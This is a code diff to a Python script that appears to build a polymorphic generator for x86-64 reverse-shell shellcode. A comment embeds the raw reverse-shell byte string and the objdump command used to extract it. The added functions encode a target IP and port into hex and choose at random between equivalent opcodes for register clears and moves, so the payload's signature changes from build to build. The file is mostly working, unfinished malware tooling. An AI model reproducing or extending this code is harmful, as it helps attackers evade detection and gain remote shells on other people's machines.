@@ -1,4 +1,6 @@
 import random
+import socket
+
 
 # using objdump on my asm reverse shell executable i got this :
 #       objdump -d ./executable|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr│
@@ -8,9 +10,47 @@ import random
 # my_code = "\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x06\x00\x00\x00\x0f\x05\x50\xeb\x00\xb8\x2a\x00\x00\x00\x5f\x57\x48\xbe\x00\x20\x40\x00\x00\x00\x00\xba\x10\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x00\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x02\x00\x00\x00\x0f\x05\xeb\x00\xb8\x3b\x00\x00\x00\x48\xbf\x08\x20\x40\x00\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05"
 # print(my_code)
 
-##------------------TO DO !!!!! MUST METAMORPH NULL BYTES BECAUSE THEY WILL BE TRUNKED-----------------------
-##------------------TO DO !!!!! MUST METAMORPH NULL BYTES BECAUSE THEY WILL BE TRUNKED-----------------------
-##------------------TO DO !!!!! MUST METAMORPH NULL BYTES BECAUSE THEY WILL BE TRUNKED-----------------------
+#---------------------------------------------------------------------------------------------------------------------
+#----------------------------------------CONVERSION FUNCTIONS---------------------------------------------------------
+#---------------------------------------------------------------------------------------------------------------------
+
+
+def decimal_to_hex(decimal_value):
+    hex_value = hex(decimal_value)[2:]  # Convert to hexadecimal and remove '0x' prefix
+    return '0x' + hex_value
+
+
+
+
+def decimal_to_hex_port(port_number_decimal):
+    # Convert decimal port number to network byte order (little-endian) in hexadecimal format
+    port_number_hex = socket.htons(port_number_decimal)
+    return port_number_hex
+
+
+def ip_to_hex_with_format(ip_address):
+    # Split the IP address into its four octets
+    octets = ip_address.split('.')
+
+    # Reverse the order of the octets
+    reversed_octets = octets[::-1]
+
+    # Convert each octet to its hexadecimal representation
+    hex_octets = [format(int(octet), '02X') for octet in reversed_octets]
+
+    # Concatenate the hexadecimal octets and add the '0x' prefix
+    hex_value = '0x' + ''.join(hex_octets)
+
+    return hex_value
+
+# Example usage:
+
+
+print(ip_to_hex_with_format("128.5.5.2"))
+print(ip_to_hex_with_format("1.5.5.1"))
+print(ip_to_hex_with_format("127.0.0.1"))
+
+
 
 
 
@@ -62,27 +102,26 @@ def int_to_hex_and_bits(integer_value):
 
 
 
-# A function that takes the OPCODE and XORs it (clears it)
-def clear(register):    
-    l=[]
-    # rax
-    if (register == "4831C0"):
-        l = ["4831D24889D0", "4831C0"]
+# A function that takes the register clears it
+def clear_rax():
+    list_ = ["4831C0", "4831D24889D0"]
+    return random.choice(list_)
 
-    # rdi
-    if (register == "4831FF"):
-        l = ["4831FF","4831C04889C7"]
 
-    # rsi
-    if (register == "4831F6"):
-        l = ["4831F6","4831D24889D6"]
+def clear_rdi():
+    list_ = ["4831FF","4831C04889C7"]
+    return random.choice(list_)
 
-    # rdx
-    if (register == "4831D2"):
-        l = ["4831D2","4831FF4889FA"]
 
-    opcode = random.choice(l)
-    return opcode
+def clear_rsi():
+    list_ = ["4831F6","4831D24889D6"]
+    return random.choice(list_)
+
+
+def clear_rdx():
+    list_ = ["4831D2","4831FF4889FA"]
+    return random.choice(list_)
+
 #---------------------------------------------------------------------------------------------------------------------
 #---------------------------------------------------------------------------------------------------------------------
 #---------------------------------------------------------------------------------------------------------------------
@@ -118,29 +157,27 @@ def mov_rax_rdx():
 def mov_rax_rax():
     list_ = ["48 89 c0"]
 
-#  mov RAX, ( an integer > 32 & =< 64 bits ) |||||| 48 c7 c0 XX XX XX XX
+
 def mov_rax_valeur(value):
-    opcode = "48 c7 c0"
     little_endian_hex, bits = int_to_hex_and_bits(value)
-    if (bits > 32 & bits <= 64):
+    #  mov RAX, ( an integer > 32 and =< 64 bits ) |||||| 48 c7 c0 XX XX XX XX
+    if (bits > 32 and bits <= 64):
+        opcode = "48 c7 c0"
         list_ = [opcode + " " + little_endian_hex]
-    elif (bits > 16 & bits <= 32):
+    #####  mov EAX, ( an integer > 16 and =< 32 bits ) |||||| b8 XX XX XX XX
+    elif (bits > 16 and bits <= 32):
+        opcode = "b8"
         list_ = [opcode + " " + little_endian_hex]
-    elif (bits > 8 & bits <= 16):
+    ##########  mov AX, (an integer > 8 and =< 16 bits ) |||||| 66 b8 XX XX
+    elif (bits > 8 and bits <= 16):
+        opcode = "66 b8"
         list_ = [opcode + " " + little_endian_hex]
-    elif (bits >= 0 & bits <= 8):
+    ###############  mov AL, (an integer =< 8 bits ) ||||||= b0 XX
+    elif (bits >= 0 and bits <= 8):
+        opcode = "b0"
         list_ = [opcode + " " + little_endian_hex]
     return random.choice(list_)
 
-#####  mov EAX, ( an integer > 16 & =< 32 bits ) |||||| b8 XX XX XX XX
-def mov_eax_valeur(value):
-    list_ = []
-##########  mov AX, (an integer > 8 & =< 16 bits ) |||||| 66 b8 XX XX
-def mov_ax_valeur(value):
-    list_ = []
-###############  mov AL, (an integer =< 8 bits ) ||||||= b0 XX
-def mov_al_valeur(value):
-    list_ = []
 
 
 #---------------------------------------------------------------------------------------------------------------------
@@ -165,18 +202,27 @@ def mov_rdi_rax():
 
 
 
-#  mov RDI, ( an integer > 32 & =< 64 bits ) |||||| 48 c7 c7 XX XX XX XX
 def mov_rdi_valeur(value):
-    list_ = []
-#####  mov EDI, ( an integer > 16 & =< 32 bits ) |||||| bf XX XX XX XX
-def mov_edi_valeur(value):
-    list_ = []
-##########  mov DI, (an integer > 8 & =< 16 bits ) |||||| 66 bf XX XX
-def mov_di_valeur(value):
-    list_ = []
-###############  mov DIL, (an integer =< 8 bits )  |||||| 40 b7 XX
-def mov_dil_valeur(value):
-    list_ = []
+    little_endian_hex, bits = int_to_hex_and_bits(value)
+    #  mov RDI, ( an integer > 32 and =< 64 bits ) |||||| 48 c7 c7 XX XX XX XX
+    if (bits > 32 and bits <= 64):
+        opcode = "48 c7 c7"
+        list_ = [opcode + " " + little_endian_hex]
+    #####  mov EDI, ( an integer > 16 and =< 32 bits ) |||||| bf XX XX XX XX
+    elif (bits > 16 and bits <= 32):
+        opcode = "bf"
+        list_ = [opcode + " " + little_endian_hex]
+    ##########  mov DI, (an integer > 8 and =< 16 bits ) |||||| 66 bf XX XX
+    elif (bits > 8 and bits <= 16):
+        opcode = "66 bf"
+        list_ = [opcode + " " + little_endian_hex]
+    ###############  mov DIL, (an integer =< 8 bits )  |||||| 40 b7 XX
+    elif (bits >= 0 and bits <= 8):
+        opcode = "40 b7"
+        list_ = [opcode + " " + little_endian_hex]
+    return random.choice(list_)
+
+
 
 
 #---------------------------------------------------------------------------------------------------------------------
@@ -200,19 +246,26 @@ def mov_rsi_rax():
     list_ = ["48 89 c6"]
 
 
-#  mov RSI, ( an integer > 32 & =< 64 bits ) |||||| 48 C7 C6 XX XX XX XX
-def mov_rsi_valeur(value):
-    list_ = []
-#####  mov ESI, ( an integer > 16 & =< 32 bits ) |||||| BE XX XX XX XX
-def mov_esi_valeur(value):
-    list_ = []
-##########  mov SI, (an integer > 8 & =< 16 bits ) |||||| 66 BE XX XX
-def mov_si_valeur(value):
-    list_ = []
-###############  mov SIL, (an integer =< 8 bits ) |||||| 40 b6 XX
-def mov_sil_valeur(value):
-    list_ = []
 
+def mov_rsi_valeur(value):
+    little_endian_hex, bits = int_to_hex_and_bits(value)
+    #  mov RSI, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C6 XX XX XX XX
+    if (bits > 32 and bits <= 64):
+        opcode = "48 c7 c6"
+        list_ = [opcode + " " + little_endian_hex]
+    #####  mov ESI, ( an integer > 16 and =< 32 bits ) |||||| BE XX XX XX XX
+    elif (bits > 16 and bits <= 32):
+        opcode = "be"
+        list_ = [opcode + " " + little_endian_hex]
+    ##########  mov SI, (an integer > 8 and =< 16 bits ) |||||| 66 BE XX XX
+    elif (bits > 8 and bits <= 16):
+        opcode = "66 be"
+        list_ = [opcode + " " + little_endian_hex]
+    ###############  mov SIL, (an integer =< 8 bits ) |||||| 40 b6 XX
+    elif (bits >= 0 and bits <= 8):
+        opcode = "40 b6"
+        list_ = [opcode + " " + little_endian_hex]
+    return random.choice(list_)
 
 
 #---------------------------------------------------------------------------------------------------------------------
@@ -235,18 +288,25 @@ def mov_rdx_rax():
     list_ = ["48 89 c2"]
 
 
-#  mov RDX, ( an integer > 32 & =< 64 bits ) |||||| 48 C7 C2 XX XX XX XX
 def mov_rdx_valeur(value):
-    list_ = []
-#####  mov EDX, ( an integer > 16 & =< 32 bits ) |||||| BA XX XX XX XX
-def mov_edx_valeur(value):
-    list_ = [] 
-##########  mov DX, (an integer > 8 & =< 16 bits ) |||||| 66 BA XX XX
-def mov_dx_valeur(value):
-    list_ = []
-###############  mov DL, (an integer =< 8 bits ) |||||| B2 XX
-def mov_dl_valeur(value):
-    list_ = []
+    little_endian_hex, bits = int_to_hex_and_bits(value)
+    #  mov RDX, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C2 XX XX XX XX
+    if (bits > 32 and bits <= 64):
+        opcode = "48 c7 c2"
+        list_ = [opcode + " " + little_endian_hex]
+    #####  mov EDX, ( an integer > 16 and =< 32 bits ) |||||| BA XX XX XX XX
+    elif (bits > 16 and bits <= 32):
+        opcode = "ba"
+        list_ = [opcode + " " + little_endian_hex]
+    ##########  mov DX, (an integer > 8 and =< 16 bits ) |||||| 66 BA XX XX
+    elif (bits > 8 and bits <= 16):
+        opcode = "66 ba"
+        list_ = [opcode + " " + little_endian_hex]
+    ###############  mov DL, (an integer =< 8 bits ) |||||| B2 XX
+    elif (bits >= 0 and bits <= 8):
+        opcode = "b2"
+        list_ = [opcode + " " + little_endian_hex]
+    return random.choice(list_)
 
 
 
@@ -254,11 +314,8 @@ def mov_dl_valeur(value):
 
 
 
-print(mov_rax_valeur(4122))
-
-
-
-
+# print(decimal_to_hex(256))
+# print(decimal_to_hex_port(1337))
 
 
 
